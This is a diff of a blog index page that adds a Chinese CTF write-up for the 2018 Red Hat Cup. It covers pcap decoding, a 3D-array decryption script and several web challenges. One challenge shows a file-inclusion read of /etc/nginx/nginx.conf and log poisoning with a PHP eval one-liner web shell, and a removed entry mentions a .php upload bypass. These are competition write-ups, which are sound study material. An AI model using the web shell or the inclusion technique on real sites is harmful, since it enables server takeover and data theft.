@@ -152,6 +152,103 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Redhat_wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/01/Redhat_wp/">红帽杯2018_Writeup</a>
+    </h1>
+  
+
+        
+        <a href="/2018/05/01/Redhat_wp/" class="archive-article-date">
+  	<time datetime="2018-05-01T15:24:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-01</time>
+</a>
+        
+      </header>
+    
+
+
+    		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>对于这次红帽杯的题目。。是真的很想吐槽啊。。</p>
+<h2 id="0X01-Not-Only-Wireshark"><a href="#0X01-Not-Only-Wireshark" class="headerlink" title="0X01 Not Only Wireshark"></a>0X01 Not Only Wireshark</h2><p>wireshark打开数据包，右键追踪TCP流，可发现从第15流开始，HTTP请求的路径和参数变为<code>/sqli/example2.php?name=123</code>。<br>写了个脚本正则按顺序抓下来所有name参数的值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">f = open(<span class="string">"Not Only Wireshark.pcapng"</span>, <span class="string">"rb"</span>)</div><div class="line">c = f.read().decode(<span class="string">'utf8'</span>,<span class="string">'ignore'</span>)</div><div class="line">f.close()</div><div class="line"></div><div class="line">x = re.findall(<span class="string">r'example2\.php\?name=([0-9A-Za-z]&#123;0,10&#125;)'</span>, c)[<span class="number">5</span>:]</div><div class="line">x = <span class="string">'5'</span>+<span class="string">''</span>.join(x)[<span class="number">4</span>:] <span class="comment"># 开头的1234替换成5</span></div><div class="line"></div><div class="line">g = open(<span class="string">'flag.zip'</span>,<span class="string">'wb'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x), <span class="number">2</span>):</div><div class="line">    s = chr(int(x[i:i+<span class="number">2</span>], <span class="number">16</span>)).encode(<span class="string">'latin-1'</span>)</div><div class="line">    g.write(s)</div><div class="line">g.close()</div></pre></td></tr></table></figure>
+<p>然后迎来了第一个吐槽到死的点，zip里面的文件是加密的，密码在哪？？？<br>找了将近一下午，后来发现HTTP请求中有个GET请求是<code>?id=1128%23</code>。微笑不起来:)</p>
+<p><img src="https://i.imgur.com/wh9sn7C.png" alt=""></p>
+<h2 id="0X02-3Dlight"><a href="#0X02-3Dlight" class="headerlink" title="0X02 3Dlight"></a>0X02 3Dlight</h2><p>这题我觉得还是挺有意思的，虽然花的时间也不少。<br>知道题目是啥意思后，要做的主要有以下几点：</p>
+<ol>
+<li>对<code>str2arr(str)</code>和<code>arr2str(arr)</code>函数进行逆运算。</li>
+<li>判断三维数组中哪些点必须‘-2’，哪些只可能‘-1’，只能‘-1’的点或list存入finL集合中</li>
+<li>对三维数组进行遍历，遍历过程中判断该点是否‘需要-2’</li>
+</ol>
+<h4 id="对于第二个问题："><a href="#对于第二个问题：" class="headerlink" title="对于第二个问题："></a>对于第二个问题：</h4><p>一个正常的38位flag填充到64位后大概长<code>flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}00000000000000000000000000</code>这样。<br>经过<code>shuffle_flag</code>后长<code>f0a0{0x0x0x0x0x0x0x0x0x0x0x}xxxxxxxxxx0x0x0x0x0x0x0x0x0x0x0x0g0l</code>这样。</p>
+<p>因此可以得出，<code>f、l、a、g、{、}</code>在数组中的固定位置和固定取值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">s[<span class="number">0</span>] = <span class="string">'f'</span></div><div class="line">s[<span class="number">63</span>] = <span class="string">'l'</span></div><div class="line">s[<span class="number">2</span>] = <span class="string">'a'</span></div><div class="line">s[<span class="number">61</span>] = <span class="string">'g'</span></div><div class="line">s[<span class="number">4</span>] = <span class="string">'&#123;'</span> </div><div class="line">s[<span class="number">27</span>] = <span class="string">'&#125;'</span></div><div class="line">arr[<span class="number">0</span>][<span class="number">0</span>] = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>] == [(ord(<span class="string">'f'</span>) &gt;&gt; g &amp; <span class="number">1</span>) <span class="keyword">for</span> g <span class="keyword">in</span> range(<span class="number">8</span>)]</div><div class="line">arr[<span class="number">7</span>][<span class="number">7</span>] = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>]</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>同时也可以得出，所有为<code>x</code>的字符所在的index他的ascii值范围必须是<code>32&lt;ord({x})&lt;127</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bin(<span class="number">127</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[::<span class="number">-1</span>] == <span class="string">'11111110'</span></div><div class="line"><span class="comment"># 反转后下标7的位置固定为0，因此只能-1，不能-2</span></div></pre></td></tr></table></figure>
+<h4 id="对于第三个问题："><a href="#对于第三个问题：" class="headerlink" title="对于第三个问题："></a>对于第三个问题：</h4><ol>
+<li>在遍历中，对<code>&lt;1</code>的值，直接return</li>
+<li>对<code>==1</code>的值，判断周围的6个方向是否有且仅有一个方向值<code>&gt;=2</code>，如果有，那个方向的点就unlight处理</li>
+<li>对<code>&gt;=2</code>的值，判断该点能否unlight-2。判断主要是如下办法：周围6个方向<code>&gt;=2</code>的值的点的个数是否比我这个点的值还小。（通俗点说就是即使你们6个方向都给我1，我扣掉6还有剩，那就代表我肯定要-2）</li>
+</ol>
+<p>但是存在一个问题：如何判断周围6个点有给1可能的个数？<br>方法：那个方向的点存在，并且值<code>&gt;=2</code>。同时，那个点满足“可以-2”，即那个点不在finL集合中。</p>
+<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></div><div class="line"><span class="comment"># python 2.x</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unstr2arr</span><span class="params">(arr)</span>:</span></div><div class="line">    s = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</div><div class="line">            tmp = <span class="number">0</span></div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> j[::<span class="number">-1</span>]:</div><div class="line">                tmp = (tmp &lt;&lt; <span class="number">1</span>) + x</div><div class="line">            s += chr(tmp)</div><div class="line">    <span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unarr2str</span><span class="params">(s)</span>:</span></div><div class="line">    arr = [[[ord(s[i*<span class="number">64</span>+j*<span class="number">8</span>+k]) <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]</div><div class="line">    <span class="keyword">return</span> arr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt; <span class="number">7</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt; <span class="number">7</span> <span class="keyword">or</span> z &lt; <span class="number">0</span> <span class="keyword">or</span> z &gt; <span class="number">7</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="comment"># arr[i][j][k]-2，周围的六个方向-1。</span></div><div class="line"><span class="comment"># 对-2的点。将result对应位置赋值为1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlight</span><span class="params">(i, j, k)</span>:</span></div><div class="line">    result[i][j][k] = <span class="number">1</span></div><div class="line">    arr[i][j][k] -= <span class="number">2</span></div><div class="line">    <span class="keyword">for</span> a, b, c <span class="keyword">in</span> L:</div><div class="line">        <span class="keyword">if</span> check(i + a, j + b, k + c):</div><div class="line">            arr[i + a][j + b][k + c] -= <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(i, j, k)</span>:</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    tt = []</div><div class="line">    <span class="keyword">if</span> arr[i][j][k] &lt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">elif</span> arr[i][j][k] == <span class="number">1</span>:</div><div class="line">        <span class="keyword">for</span> a, b, c <span class="keyword">in</span> L:</div><div class="line">            <span class="keyword">if</span> check(i + a, j + b, k + c) <span class="keyword">and</span> arr[i + a][j + b][k + c] &gt;= <span class="number">2</span>:</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> tt:</div><div class="line">                    tt = [i + a, j + b, k + c]</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="keyword">return</span></div><div class="line">        <span class="keyword">if</span> tt:</div><div class="line">            unlight(tt[<span class="number">0</span>], tt[<span class="number">1</span>], tt[<span class="number">2</span>])</div><div class="line">    <span class="keyword">else</span>: </div><div class="line"></div><div class="line">        <span class="keyword">for</span> a, b, c <span class="keyword">in</span> L:</div><div class="line">            <span class="keyword">if</span> check(i + a, j + b, k + c) <span class="keyword">and</span> arr[i + a][j + b][k + c] &gt;= <span class="number">2</span> <span class="keyword">and</span> (i + a, j + b) <span class="keyword">not</span> <span class="keyword">in</span> finL <span class="keyword">and</span> (i + a, j + b, k + c) <span class="keyword">not</span> <span class="keyword">in</span> finL:</div><div class="line">                count += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> arr[i][j][k] - count &gt; <span class="number">0</span>:</div><div class="line">            <span class="keyword">global</span> onchange</div><div class="line">            onchange = <span class="keyword">True</span></div><div class="line">            unlight(i, j, k)</div><div class="line"></div><div class="line">iList = []</div><div class="line"><span class="comment"># flag: 'flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;00000000000000000000000000'</span></div><div class="line">fake = <span class="string">r'f0a0&#123;0x0x0x0x0x0x0x0x0x0x0x&#125;xxxxxxxxxx0x0x0x0x0x0x0x0x0x0x0x0g0l'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</div><div class="line">    <span class="keyword">if</span> fake[i] != <span class="string">'0'</span>:</div><div class="line">        iList.append(i)</div><div class="line"></div><div class="line">d = &#123;<span class="number">0</span> : <span class="string">'f'</span>, <span class="number">63</span> : <span class="string">'l'</span>, <span class="number">2</span> : <span class="string">'a'</span>, <span class="number">61</span> : <span class="string">'g'</span>, <span class="number">4</span> : <span class="string">'&#123;'</span>, <span class="number">27</span> : <span class="string">'&#125;'</span>&#125; </div><div class="line">s = <span class="string">'0203040102040502020201020204050403030000030406030504020304040604040603040605060203050506050505020403030103050502040503020304030304040303020504020505030302020503040303020305050301040304040506050205030305060603030607050607070303040303030605030404040102030204040302040405040006040305040402030405030304060301020103020505040303040301040703010406040507070201040305040707020103050505050503030302020203060402020302040606040206050504070702010504050405080502040303040507040105040403060703000404040406070201020405020406030203040302020605010302010206070201060502010607020005040203050704010203020305060401030201020407040202040302060704030203040305060201060606040305040206040302050703000403010306070201020202030706020102020204050503020404010103060603050505060607060504040404070602010506070501030303040505030206050303010603040706040002050505070401010305050706050204030302020607020505060403050605040505050405030102050604020303030304060201060503020405020106070402040602030505020205070504050501050504020205060203030302010507040202040303050402'</span></div><div class="line">s = s.decode(<span class="string">'hex'</span>)</div><div class="line">arr = unarr2str(s)</div><div class="line"></div><div class="line">result = [[[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)]</div><div class="line">L =[[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>]]</div><div class="line">finL = set() <span class="comment"># 存放只能-1不能-2的点和list，如点arr[m][n][7]和arr[0][0]</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> iList: </div><div class="line">    n = j % <span class="number">8</span></div><div class="line">    m = (j - n) // <span class="number">8</span></div><div class="line">    finL.add((m, n, <span class="number">7</span>))</div><div class="line"></div><div class="line"><span class="comment"># 对f、l、a、g、&#123;、&#125;这6个字符的二进制中为1的位置，先进行unlight处理（中心-2.周围-1）</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</div><div class="line">    L2 = [(ord(d[k]) &gt;&gt; g &amp; <span class="number">1</span>) <span class="keyword">for</span> g <span class="keyword">in</span> range(<span class="number">8</span>)]</div><div class="line">    n = k % <span class="number">8</span></div><div class="line">    m = (k - n) // <span class="number">8</span></div><div class="line">    finL.add((m, n))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        <span class="keyword">if</span> L2[i] == <span class="number">1</span>:</div><div class="line">            unlight(m, n, i)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    onchange = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">                decrypt(i, j, k)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> onchange:</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="comment">#for i in range(8):</span></div><div class="line"><span class="comment">#    print(result[i])</span></div><div class="line"><span class="comment">#print('\n-----------------------------------\n')</span></div><div class="line"><span class="comment">#for i in range(8):</span></div><div class="line"><span class="comment">#    print(arr[i])</span></div><div class="line"></div><div class="line">flag = <span class="string">''</span></div><div class="line">ss = unstr2arr(result)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">    flag += ss[i*<span class="number">2</span>]+ss[<span class="number">-1</span>-i*<span class="number">2</span>]</div><div class="line">print(flag)</div></pre></td></tr></table></figure>
+<h2 id="0X03-shopping-log"><a href="#0X03-shopping-log" class="headerlink" title="0X03 shopping log"></a>0X03 shopping log</h2><p>提一下，主要是太想吐槽了。</p>
+<ol>
+<li>提示<code>Site is tmvb.com</code>，玩了老半天，google了一波，whois查询了一波，爆破了子域名，Host也试着改成了<code>Host: tmvb.com</code>。后来才发现要加上<code>www</code>，excuse me??</li>
+<li>改Referer很正常。</li>
+<li>提示<code>Japan sales only</code>，试了改了<code>Accept-Language: ja;q=0.9</code>，也试过了XFF头为日本IP。都不行！！后来队友突然可以了，才发现要XFF头和language同时改！并且<code>q=0.9</code>要删去！excuse me???</li>
+<li>终于有正常页面了，要干嘛？订单号加验证码的爆破？？？</li>
+</ol>
+<p>告辞！</p>
+<h2 id="0x04-biubiubiu"><a href="#0x04-biubiubiu" class="headerlink" title="0x04 biubiubiu"></a>0x04 biubiubiu</h2><p>进去就是一波文件包含！试了下<code>php://filter</code>不管用，猜测应该是被过滤了。提示了<code>users.sql</code>感觉没是用。<br>然后就读了一波配置文件<code>?page=/etc/nginx/nginx.conf</code>爽歪歪。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">##</span></div><div class="line"><span class="comment"># Logging Settings</span></div><div class="line"><span class="comment">##</span></div><div class="line"></div><div class="line"><span class="attribute">access_log</span> /var/log/nginx/access.log;</div><div class="line"><span class="attribute">error_log</span> /var/log/nginx/error.log;</div></pre></td></tr></table></figure>
+<p>看到了日志文件路径就想到了包含日志文件写入php代码。反手一个php一句话<code>?page=&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;</code>，下一步就是菜刀了。<br>看到了数据库的帐号密码，flag就在数据库里了。<br><figure class="highlight php"><figcaption><span>conn.php</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$db_host = <span class="string">'mysql'</span>;</div><div class="line">$db_name = <span class="string">'user_admin'</span>;</div><div class="line">$db_user = <span class="string">'Dog'</span>;</div><div class="line">$db_pwd = <span class="string">''</span>;</div><div class="line"></div><div class="line">$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$conn)&#123;</div><div class="line">    <span class="keyword">die</span>(mysqli_connect_error());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/05/01/Redhat_wp/">read more.. >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-starctf2018-SimpleWeb-wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -819,76 +916,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/10/03/Xdebug/">read more.. >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-bugkuctf-web-writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/30/bugkuctf-web-writeup/">bugkuctf_web_writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2017/09/30/bugkuctf-web-writeup/" class="archive-article-date">
-  	<time datetime="2017-09-30T06:53:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-30</time>
-</a>
-        
-      </header>
-    
-
-
-    		
-
-
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>写完这个WP简直快吐。</p>
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>F12即可发现flag在注释中</p>
-<h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>这题对Content-Type和filename做了检查。上传一个jpg文件，burpsuite抓包将文件扩展改为php即可拿到flag。</p>
-<h2 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h2><p>在Resource中找到code.js文件，发现flag。</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/0.png" alt=""></p>
-        
-          <a class="article-more-a" href="/2017/09/30/bugkuctf-web-writeup/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/30/bugkuctf-web-writeup/">read more.. >></a>
         </p>
       
 
